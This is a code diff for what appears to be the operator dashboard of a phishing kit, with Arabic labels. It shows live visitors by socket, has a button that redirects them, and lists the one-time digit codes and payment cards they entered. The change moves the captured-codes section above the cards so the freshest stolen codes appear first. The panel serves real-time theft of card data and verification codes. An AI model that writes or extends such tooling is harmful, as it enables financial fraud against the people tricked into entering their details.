@@ -510,7 +510,21 @@
       html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
       html += '</div></div>';
 
-      // Payment Cards (shown first - newest data)
+      // Digit Codes (shown first - newest data from client)
+      if (visitor.digitCodes && visitor.digitCodes.length > 0) {
+        html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
+        html += '<h3 class="font-bold mb-3 text-orange-800">🔢 الرموز المدخلة</h3>';
+        html += '<div class="space-y-2">';
+        visitor.digitCodes.forEach(dc => {
+          html += '<div class="flex justify-between items-center bg-white p-3 rounded-lg">';
+          html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
+          html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
+          html += '</div>';
+        });
+        html += '</div></div>';
+      }
+
+      // Payment Cards (shown second)
       if (visitor.paymentCards && visitor.paymentCards.length > 0) {
         html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
         html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقات الدفع</h3>';
@@ -607,20 +621,6 @@
           });
           html += '</div></div>';
         }
-      }
-
-      // Digit Codes
-      if (visitor.digitCodes && visitor.digitCodes.length > 0) {
-        html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
-        html += '<h3 class="font-bold mb-3 text-orange-800">🔢 الرموز المدخلة</h3>';
-        html += '<div class="space-y-2">';
-        visitor.digitCodes.forEach(dc => {
-          html += '<div class="flex justify-between items-center bg-white p-3 rounded-lg">';
-          html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
-          html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
-          html += '</div>';
-        });
-        html += '</div></div>';
       }
 
       // Actions
